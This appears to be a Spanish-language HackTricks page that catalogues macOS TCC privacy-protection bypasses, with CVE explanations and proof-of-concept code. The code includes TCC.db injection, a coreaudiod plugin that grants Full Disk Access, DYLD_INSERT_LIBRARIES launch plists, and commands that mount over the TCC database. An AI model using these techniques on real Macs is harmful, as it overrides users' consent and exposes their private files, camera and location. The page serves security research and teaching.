# TCC Bypasses de macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Por funcionalidad

### Write Bypass

Esto no es un bypass, es simplemente cómo funciona TCC: **No protege contra la escritura**. Si Terminal **no tiene acceso para leer el Desktop de un usuario, aún puede escribir en él**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
El **atributo extendido `com.apple.macl`** se añade al nuevo **archivo** para dar a la **app creators** acceso para leerlo.

### TCC ClickJacking

Es posible **colocar una ventana sobre el aviso de TCC** para hacer que el usuario lo **acepte** sin darse cuenta. Puedes encontrar un PoC en [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Solicitud de TCC con un nombre arbitrario

Un atacante puede **crear apps con cualquier nombre** (por ejemplo, Finder, Google Chrome...) en el **`Info.plist`** y hacer que soliciten acceso a una ubicación protegida por TCC. El usuario pensará que la aplicación legítima es la que solicita este acceso.\
Además, es posible **eliminar la app legítima del Dock y colocar la falsa en su lugar**, de modo que, cuando el usuario haga clic en la falsa (que puede usar el mismo icono), esta pueda llamar a la legítima, solicitar permisos de TCC y ejecutar malware, haciendo que el usuario crea que la app legítima solicitó el acceso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Más información y PoC en:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

De forma predeterminada, el acceso mediante **SSH solía tener "Full Disk Access"**. Para desactivarlo, es necesario que aparezca en la lista, pero deshabilitado (eliminarlo de la lista no eliminará esos privilegios):

![Solicitud de TCC con un nombre arbitrario - SSH Bypass: De forma predeterminada, el acceso mediante SSH solía tener "Full Disk Access". Para desactivarlo, es necesario que aparezca en la lista, pero deshabilitado (eliminarlo...](<../../../../../images/image (1077).png>)

Aquí puedes encontrar ejemplos de cómo algunos **malwares han podido evadir esta protección**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Ten en cuenta que ahora, para poder habilitar SSH, necesitas **Full Disk Access**

### Gestión de extensiones - CVE-2022-26767

El atributo **`com.apple.macl`** se asigna a los archivos para dar a una **aplicación determinada permisos para leerlos.** Este atributo se establece cuando se **arrastra y suelta** un archivo sobre una app o cuando un usuario hace **doble clic** en un archivo para abrirlo con la **aplicación predeterminada**.

Por lo tanto, un usuario podría **registrar una app maliciosa** para gestionar todas las extensiones y llamar a Launch Services para **abrir** cualquier archivo (por lo que el archivo malicioso obtendría acceso para leerlo).

### iCloud

El entitlement **`com.apple.private.icloud-account-access`** permite comunicarse con el servicio XPC **`com.apple.iCloudHelper`**, que **proporcionará tokens de iCloud**.

**iMovie** y **Garageband** tenían este entitlement y otros que lo permitían.

Para obtener más **información** sobre el exploit para **obtener tokens de iCloud** mediante ese entitlement, consulta la charla: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Una app con el permiso **`kTCCServiceAppleEvents`** podrá **controlar otras apps**. Esto significa que podría **abusar de los permisos concedidos a las otras apps**.

Para obtener más información sobre Apple Scripts, consulta:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Por ejemplo, si una app tiene **permiso de Automation sobre `iTerm`**, en este ejemplo **`Terminal`** tiene acceso sobre iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Sobre iTerm

Terminal, que no tiene FDA, puede llamar a iTerm, que sí lo tiene, y utilizarlo para realizar acciones:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### A través de Finder

O si una App tiene acceso a través de Finder, podría ejecutar un script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Por comportamiento de la App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

El **tccd daemon** de userland utilizaba la variable de entorno **`HOME`** para acceder a la base de datos de usuarios de TCC desde: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Según [esta publicación de Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), y dado que el daemon de TCC se ejecuta mediante `launchd` dentro del dominio del usuario actual, es posible **controlar todas las variables de entorno** que se le pasan.\
Por lo tanto, un **attacker podría establecer la variable de entorno `$HOME`** en **`launchctl`** para que apuntara a un **directorio** **controlado**, reiniciar el daemon de **TCC** y, a continuación, **modificar directamente la base de datos de TCC** para concederse a sí mismo **todos los TCC entitlements disponibles** sin mostrar nunca un prompt al usuario final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes tenía acceso a ubicaciones protegidas por TCC, pero cuando se crea una nota, esta se **crea en una ubicación no protegida**. Por tanto, se podía pedir a Notes que copiara un archivo protegido en una nota (es decir, en una ubicación no protegida) y después acceder al archivo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

El binario `/usr/libexec/lsd`, junto con la librería `libsecurity_translocate`, tenía el entitlement `com.apple.private.nullfs_allow`, que le permitía crear montajes **nullfs**, y tenía el entitlement `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** para acceder a cualquier archivo.

Era posible añadir el atributo de cuarentena a "Library", llamar al servicio XPC **`com.apple.security.translocation`**, y este mapearía Library a **`$TMPDIR/AppTranslocation/d/d/Library`**, donde se podía **acceder** a todos los documentos dentro de Library.

### CVE-2024-44131 - FileProvider symlink race

Las aplicaciones que delegan las operaciones de archivos a un **privileged helper** (en este caso, **`fileproviderd`** / **`Files.app`**) copian o mueven elementos **en nombre del usuario**, por lo que la copia se ejecuta con los privilegios del helper en lugar de los del caller.

Jamf Threat Labs mostró que la validación de symlinks realizada antes de la operación puede sufrir una **race condition**: en lugar de colocar el symlink en el **último** componente de la ruta (que se comprueba), el atacante intercambia un directorio **intermedio** de la ruta **después de que la copia ya haya comenzado**. Entonces, el privileged helper sigue el enlace controlado por el atacante y lee o escribe en ubicaciones protegidas por TCC **sin mostrar nunca un prompt**.

Los directorios que **no** están protegidos por un UUID aleatorio en su ruta (por ejemplo, `~/Library/Mobile Documents/com~apple~CloudDocs`) son los objetivos más sencillos, porque el atacante puede predecir la ruta completa para ejecutar la race condition.

> [!TIP]
> Este es el patrón genérico que se debe buscar: **cualquier proceso privilegiado que resuelva una ruta más de una vez** (check-then-use, o `rename()`/`copyfile()` resolviendo el origen y el destino por separado) puede sufrir una race condition si se intercambia un directorio en mitad de la ruta. Solo `O_NOFOLLOW_ANY`, `openat()` sobre un directory FD ya abierto, o `realpath()` + re-validación cierran realmente la ventana.

Más información en [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).

### SQLITE_SQLLOG_DIR

`libsqlite3` puede compilarse con `SQLITE_ENABLE_SQLLOG`, lo que añade un logging hook controlado por variables de entorno ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):

- **`SQLITE_SQLLOG_DIR=path`** – para **cada base de datos que se abre**, se escribe en `path` una **copia del archivo de la base de datos** y un log de las sentencias SQL (el directorio debe existir previamente).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – crea una **copia nueva cada vez** que se abre o adjunta una DB, en lugar de reutilizar una.
- **`SQLITE_SQLLOG_CONDITIONAL`** – solo registra una conexión si existe un archivo `<database>-sqllog` junto a la DB principal.

Si puedes inyectar esta variable en un proceso que tenga **FDA** y abra bases de datos SQLite, este **copiará sin problemas esas bases de datos protegidas** en un directorio que controles. Como el nombre del archivo de destino se deriva de datos controlados por el atacante, un **symlink colocado en el destino** convierte la misma primitiva en una **escritura arbitraria de archivos** con los privilegios del proceso objetivo.

### **SQLITE_AUTO_TRACE**

Si se establece la variable de entorno **`SQLITE_AUTO_TRACE`**, la librería **`libsqlite3.dylib`** empezará a **registrar** todas las consultas SQL. Muchas aplicaciones usaban esta librería, por lo que era posible registrar todas sus consultas SQLite.

Varias aplicaciones de Apple utilizaban esta librería para acceder a información protegida por TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Búsqueda de escrituras de archivos impulsadas por env-var

Las dos entradas anteriores son ejemplos de la misma técnica genérica, y vale la pena buscar más: **los frameworks cargados en apps con privilegios TCC suelen exponer variables de entorno de debug/logging que hacen que el proceso cree un archivo en una ruta controlada por el caller**.

Flujo de trabajo para encontrarlas:

1. Elige un objetivo con FDA u otro permiso TCC interesante (`Music`, `TV`, `Terminal`, agentes MDM...) y enumera los frameworks que enlaza (`otool -L`, `vmmap`).
2. Haz grep en esos frameworks buscando strings de `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Establece las variables candidatas mediante `launchctl setenv NAME /path/you/control`, inicia la app y observa qué hace en el filesystem con `fs_usage -w -f filesys <pid>` o `sudo fs_usage | grep <path>`.
4. Si el proceso **crea o renombra** un archivo en tu directorio, tienes una write primitive: apunta el destino a un symlink (o provoca una race en un directorio intermedio, como en CVE-2024-44131 anterior) para redirigirlo a `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Hay dos factores que limitan esto. Primero, las variables `DYLD_*` se ignoran para binaries con hardened runtime **a menos que** la app incluya el entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process"); consulta también [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Segundo, Apple elimina las variables de debug individuales de los frameworks cuando se reportan, por lo que una variable que funcionaba en una release de macOS suele desaparecer en la siguiente. Si una app se niega silenciosamente a iniciarse después de establecer una, considera que esa variable ya está filtrada.

Consulta [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) para ver el truco equivalente con variables del linker.

### Apple Remote Desktop

Como root, podrías habilitar este servicio y el **agente ARD tendría full disk access**, que después podría ser abusado por un usuario para hacer que copie una nueva **base de datos de usuario de TCC**.

## Mediante **NFSHomeDirectory**

TCC utiliza una base de datos en la carpeta HOME del usuario para controlar el acceso a recursos específicos del usuario en **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Por lo tanto, si el usuario consigue reiniciar TCC con una variable de entorno `$HOME` que apunte a una **carpeta diferente**, podría crear una nueva base de datos de TCC en **/Library/Application Support/com.apple.TCC/TCC.db** y engañar a TCC para que conceda cualquier permiso TCC a cualquier app.

> [!TIP]
> Ten en cuenta que Apple utiliza la configuración almacenada en el perfil del usuario, dentro del atributo **`NFSHomeDirectory`**, para determinar el **valor de `$HOME`**. Por lo tanto, si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **weaponize** esta opción con un TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

El **primer POC** utiliza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) y [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar la carpeta **HOME** del usuario.

1. Obtén un blob _csreq_ para la app objetivo.
2. Planta un archivo _TCC.db_ falso con el acceso requerido y el blob _csreq_.
3. Exporta la entrada de Directory Services del usuario con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifica la entrada de Directory Services para cambiar el directorio home del usuario.
5. Importa la entrada modificada de Directory Services con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Detén el _tccd_ del usuario y reinicia el proceso.

El segundo POC utilizaba **`/usr/libexec/configd`**, que tenía `com.apple.private.tcc.allow` con el valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era posible ejecutar **`configd`** con la opción **`-t`**, mediante la cual un attacker podía especificar un **Bundle personalizado para cargar**. Por lo tanto, el exploit **reemplaza** el método de **`dsexport`** y **`dsimport`** para cambiar el directorio home del usuario por una **inyección de código en `configd`**.

Para obtener más información, consulta el [**reporte original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Mediante process injection

Existen distintas técnicas para inyectar código dentro de un proceso y abusar de sus privilegios TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Además, el process injection más común encontrado para bypass TCC es mediante **plugins (load library)**.\
Los plugins son código adicional, normalmente en forma de libraries o plist, que será **cargado por la aplicación principal** y se ejecutará bajo su contexto. Por lo tanto, si la aplicación principal tenía acceso a archivos restringidos por TCC (mediante permisos concedidos o entitlements), el **código personalizado también lo tendrá**.

### CVE-2020-27937 - Directory Utility

La aplicación `/System/Library/CoreServices/Applications/Directory Utility.app` tenía el entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, cargaba plugins con extensión **`.daplug`** y **no tenía el** hardened runtime.

Para weaponize este CVE, se **cambia** **`NFSHomeDirectory`** (abusando del entitlement anterior) para poder **tomar el control de la base de datos TCC de los usuarios** y realizar un bypass de TCC.

Para obtener más información, consulta el [**reporte original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

El binary **`/usr/sbin/coreaudiod`** tenía los entitlements `com.apple.security.cs.disable-library-validation` y `com.apple.private.tcc.manager`. El primero **permitía la inyección de código** y el segundo le daba acceso para **gestionar TCC**.

Este binary permitía cargar **plugins de terceros** desde la carpeta `/Library/Audio/Plug-Ins/HAL`. Por lo tanto, era posible **cargar un plugin y abusar de los permisos TCC** con este POC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para más información, consulta el [**informe original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-Ins de Device Abstraction Layer (DAL)

Las aplicaciones del sistema que abren el flujo de la cámara mediante Core Media I/O (aplicaciones con **`kTCCServiceCamera`**) cargan **estos plugins en el proceso**, ubicados en `/Library/CoreMediaIO/Plug-Ins/DAL` (no están restringidos por SIP).

Basta con guardar allí una library con el **constructor** habitual para **inyectar código**.

Varias aplicaciones de Apple eran vulnerables a esto.

### Firefox

La aplicación Firefox tenía los entitlements `com.apple.security.cs.disable-library-validation` y `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para obtener más información sobre cómo explotarlo fácilmente, consulta el [**informe original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

El binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tenía los entitlements **`com.apple.private.tcc.allow`** y **`com.apple.security.get-task-allow`**, lo que permitía inyectar código en el proceso y utilizar los privilegios de TCC.

### CVE-2023-26818 - Telegram

Telegram tenía los entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** y **`com.apple.security.cs.disable-library-validation`**, por lo que era posible abusar de él para **obtener acceso a sus permisos**, como grabar con la cámara. Puedes [**encontrar el payload en el writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Observa que, para utilizar la variable de entorno y cargar una library, se creó un **plist personalizado** para inyectar esta library y se utilizó **`launchctl`** para iniciarla:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Mediante invocaciones de open

Es posible invocar **`open`** incluso estando en sandbox

### Scripts de Terminal

Es bastante común conceder **Full Disk Access (FDA)** a Terminal, al menos en ordenadores utilizados por personas técnicas. También es posible invocar scripts **`.terminal`** con dicho acceso.

Los scripts **`.terminal`** son archivos plist como este, con el comando que se ejecutará en la clave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Una aplicación podría escribir un script de terminal en una ubicación como /tmp y ejecutarlo con un comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mediante el montaje

### CVE-2020-9771 - mount_apfs TCC bypass y escalada de privilegios

**Cualquier usuario** (incluso los que no tienen privilegios) puede crear y montar un snapshot de Time Machine y **acceder a TODOS los archivos** de ese snapshot.\
El **único privilegio** necesario es que la aplicación utilizada (como `Terminal`) tenga acceso de **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que debe ser concedido por un administrador.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Una explicación más detallada se puede [**encontrar en el informe original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 y CVE-2021-30808 - Montar sobre el archivo TCC

Aunque el archivo de la base de datos de TCC esté protegido, era posible **montar sobre el directorio** un nuevo archivo TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Consulta el **exploit completo** en el [**writeup original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Como se explica en el [writeup original](https://www.kandji.io/blog/macos-audit-story-part2), este CVE abusaba de `diskarbitrationd`.

La función `DADiskMountWithArgumentsCommon` del framework público `DiskArbitration` realizaba las comprobaciones de seguridad. Sin embargo, era posible evadirlas llamando directamente a `diskarbitrationd` y, por tanto, usar elementos `../` en la ruta y symlinks.

Esto permitía a un atacante realizar mounts arbitrarios en cualquier ubicación, incluso sobre la base de datos de TCC, debido al entitlement `com.apple.private.security.storage-exempt.heritable` de `diskarbitrationd`.

### asr

La herramienta **`/usr/sbin/asr`** permitía copiar el disco completo y montarlo en otra ubicación evadiendo las protecciones de TCC.

### Location Services

Existe una tercera base de datos de TCC en **`/var/db/locationd/clients.plist`** que indica qué clientes tienen permitido **acceder a Location Services**.\
La carpeta **`/var/db/locationd/` no estaba protegida frente al mounting de DMG**, por lo que era posible montar nuestro propio plist.

## Mediante apps de inicio


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Mediante grep

En varias ocasiones, los archivos almacenan información sensible como emails, números de teléfono, mensajes... en ubicaciones no protegidas (lo que cuenta como una vulnerabilidad en Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Esto ya no funciona, pero [**sí funcionaba en el pasado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Otra forma usando [**eventos de CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referencias

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
